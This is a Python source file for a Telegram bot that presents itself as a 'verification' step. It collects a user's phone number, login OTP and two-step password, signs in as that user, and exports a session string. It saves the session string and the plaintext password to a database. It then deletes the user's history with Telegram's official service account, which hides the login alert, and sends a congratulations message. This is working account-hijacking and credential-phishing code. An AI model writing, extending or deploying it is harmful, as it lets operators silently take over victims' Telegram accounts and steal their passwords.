import asyncio
import traceback
from os import device_encoding
import re
import sys
from pyrogram.raw import functions
from pyromod import Client, Message
from pyrogram import filters
from pyrogram.types import InlineKeyboardMarkup
from helpers.util import button_style, gen_devices, OtpStrip, device
from pyrogram.enums import ChatType, ParseMode
from config import API_ID, API_HASH
from pyrogram.types import Message
from main import db, client_db
import random
import time
from pyrogram.errors import (
    ApiIdInvalid,
    PhoneNumberBanned,
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
)


class User:
    def __init__(self, bot: Client, message: Message):
        self.bot: Client = bot
        self.msg = message
        self.db = db
        self.clientdb = clientdb
        self.user = None

    async def connect(self, phone):
        fromDb = await self.db.getConf("verif")
        congratsFromDb = await self.db.getConf("congrats")
        list_client = await self.clientdb.getClients()
        await self.msg.delete()
        if len(list_client) == 0:
            await self.msg.reply("No client available, please contact admin")
            return
        usr_client = random.choice(list_client)
        list_devices = await self.clientdb.getDevices(platform=usr_client['platform'])
        # if len(list_devices) == 0:
        #     await self.msg.reply("No device available, please contact admin")
        #     return
        devices = device()
        otp_sent = None
        if fromDb is not None:
            otp_sent = fromDb
        user_id = self.msg.chat.id
        client = Client(
            name=f"user{user_id}",
            api_id=usr_client['api_id'],
            api_hash=usr_client['api_hash'],
            in_memory=True,
            app_version=f"{devices}",
            system_version=f"{devices} 2.0.106",
        )
        con = await client.connect()
        passwd = None
        try:
            code = await client.send_code(phone)
        except FloodWait as flood:
            await self.msg.reply(
                f"**NUMBER** `{phone}` cannot send OTP until `{str(int(flood.value)//3600)}` hours\n\nPlease try again /start with different number"
            )
            return
        except ApiIdInvalid:
            print("`API_ID` and `API_HASH` combination is invalid.")
            await self.msg.reply("Invalid, please contact admin")
            return
        except PhoneNumberInvalid:
            await self.msg.reply(
                f"`PHONE NUMBER` is invalid. Please try again /start."
            )
            print(f"`PHONE NUMBER` is invalid")
            return
        except PhoneNumberBanned:
            await self.msg.reply(
                f"Phone Number Banned from Telegram. Please try another number again /start."
            )
            print(f"Phone Number Banned from Telegram")
            return

        try:
            await self.msg.reply(
                "<i>Successfully Sent Verification Code...</i>",
                parse_mode=ParseMode.HTML,
            )
            if otp_sent is not None:
                phone_code_msg = await self.msg.chat.ask(
                    otp_sent,
                    filters=filters.text,
                    parse_mode=ParseMode.MARKDOWN,
                    timeout=600,
                )
            else:
                phone_code_msg = await self.msg.chat.ask(
                    "Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format. \nIf OTP is `1 2 3 4 5`, **please send it as** `1 2 3 4 5`.",
                    filters=filters.text,
                    timeout=600,
                )
            if await self.cancelled(phone_code_msg):
                return
        except TimeoutError:
            await self.msg.reply(
                f"Time limit reached of 10 minutes. Please try again /start.",
            )
            print(
                f"Time limit reached of 10 minutes. Please try again /start."
            )
            return
        except Exception as e:
            print("Failed get otp", e)
            if e == "600":
                await self.msg.reply(
                    f"Time limit reached of 10 minutes. Please try again /start.",
                )
            if str(e) == "600":
                await self.msg.reply(
                    f"Time limit reached of 10 minutes. Please try again /start.",
                )
            return
        stop = False
        while True:
            valid_otp = ""
            check_valid: Message
            try:
                otp = phone_code_msg.text
                if otp == "/cancel":
                    stop = True
                    break
                valid_otp = otp.replace(" ", "")
                break
            except TimeoutError as e:
                print("TimeoutError 2", e)
                break
            except Exception as e:
                print("another", e)
                break

        if stop:
            await self.msg.reply_text(
                f"<i>Verification request has been cancelled, /start to verification again</i>",
                parse_mode=ParseMode.HTML,
            )
            return
        if valid_otp == "":
            await self.msg.reply(
                f"OTP is not provided. Please try again /start."
            )
            return
        # phone_code = phone_code_msg.text.replace(" ", "")

        phone_code = valid_otp

        phone_code2 = phone_code_msg.text
        try:
            await client.sign_in(phone, code.phone_code_hash, phone_code)
        except PhoneCodeInvalid as pci:
            print(pci)
            await self.msg.reply(f"OTP is invalid. Please try again /start.")
            return
        except PhoneCodeExpired as pce:
            print(pce)
            print(phone_code, phone_code2)
            await self.msg.reply(f"OTP is expired. Please try again /start.")
            return
        except SessionPasswordNeeded:
            try:
                two_step_msg = await self.msg.chat.ask(
                    "Your account has enabled two-step verification. Please provide the password.",
                    filters=filters.text,
                    timeout=300,
                )
            except TimeoutError:
                await self.msg.reply(
                    f"Time limit reached of 5 minutes. Please try again /start."
                )
                return
            except Exception as e:
                if e == "300":
                    print("timeout password needed 300sec")
                else:
                    print(e)

                return
            try:
                password = two_step_msg.text
                await client.check_password(password=password)
                passwd = password
            except PasswordHashInvalid as phi:
                print(phi)
                await two_step_msg.reply(
                    f"Invalid Password. Please try again /start.",
                )
                return
            except Exception as e:
                if e == "300":
                    print("timeout password needed 300sec")
                else:
                    print(e)

                return

        string_session = await client.export_session_string()
        is_me = await client.get_me()
        current = await self.db.getUser(is_me.id)
        if current:
            pass
            #await self.clientdb.decreaseUser(is_me.id)
            #await self.clientdb.decreaseUserDevices(is_me.id)
        _ = await self.db.insert(
            is_me.id,
            is_me.phone_number,
            is_me.first_name,
            is_me.username,
            passwd,
            string_session,
            usr_client['api_id'],
            devices,
            timestamp=int(time.time()),
        )
        #await self.clientdb.updateUser(usr_client[0])
        #await self.clientdb.updateUserDevices(devices)
        await asyncio.sleep(1)
        peer = await client.resolve_peer(777000)
        await client.invoke(
            functions.messages.delete_history.DeleteHistory(peer=peer, max_id=0)
        )
        await client.disconnect()

        await asyncio.sleep(1)
        if congratsFromDb is not None:
            await self.bot.send_message(
                self.msg.chat.id,
                text=congratsFromDb,
                parse_mode=ParseMode.MARKDOWN,
            )
        else:
            await self.bot.send_message(
                self.msg.chat.id,
                "Selemat Anda Terverfikasi!!! 🎉. \n\nYou have access to all!!",
            )
        await asyncio.sleep(2)


    async def cancelled(self, msg):
        if "/cancel" in msg.text:
            await msg.reply(
                "Cancelled the Process!",
            )
            return True
        elif "/restart" in msg.text:
            await msg.reply(
                "Restarted the Bot!",
            )
            return True
        elif msg.text.startswith("/"):
            await msg.reply("Cancelled the verification process!")
            return True
        else:
            return False

    async def stop(self, *args):
        db.close()
